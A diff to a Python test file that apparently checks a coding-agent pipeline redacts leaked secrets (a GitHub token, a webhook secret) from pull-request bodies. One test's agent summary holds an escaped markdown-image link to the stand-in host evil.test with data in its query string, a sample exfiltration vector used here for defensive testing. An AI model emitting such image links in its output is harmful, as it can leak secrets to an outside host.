@@ -516,13 +516,33 @@ async def test_agent_summary_secrets_are_redacted_in_the_pr(
     class LeakySummary(ScriptedAgent):
         async def run(self, task: AgentTask) -> AgentResult:
             result = await super().run(task)
-            return result.model_copy(update={"summary": "token ghp_supersecret123"})
+            # The mask must not rebuild the image syntax _inert escaped.
+            summary = "token !ghp_supersecret123(https://evil.test/p.png?d=x)"
+            return result.model_copy(update={"summary": summary})
 
     pipeline = make_pipeline(LeakySummary([fix_add]), github_token=SecretStr("ghp_supersecret123"))
     job = await pipeline.run(claim(store, "CALC-1"))
     body = str(_pr(job)["body"])
     assert "ghp_supersecret123" not in body
-    assert "[REDACTED]" in body
+    assert "!REDACTED(https://evil.test" in body
+    assert "](" not in body.split("## Agent summary")[1]
+
+
+async def test_secrets_that_escaping_would_split_are_redacted(
+    make_pipeline: MakePipeline, store: JobStore
+) -> None:
+    class LeakySummary(ScriptedAgent):
+        async def run(self, task: AgentTask) -> AgentResult:
+            result = await super().run(task)
+            return result.model_copy(update={"summary": "hunter2#webhook"})
+
+    pipeline = make_pipeline(
+        LeakySummary([fix_add]), jira_webhook_secret=SecretStr("hunter2#webhook")
+    )
+    job = await pipeline.run(claim(store, "CALC-1"))
+    body = str(_pr(job)["body"])
+    assert "hunter2" not in body
+    assert "REDACTED" in body
 
 
 async def test_failed_retry_keeps_the_first_attempt_as_a_draft(
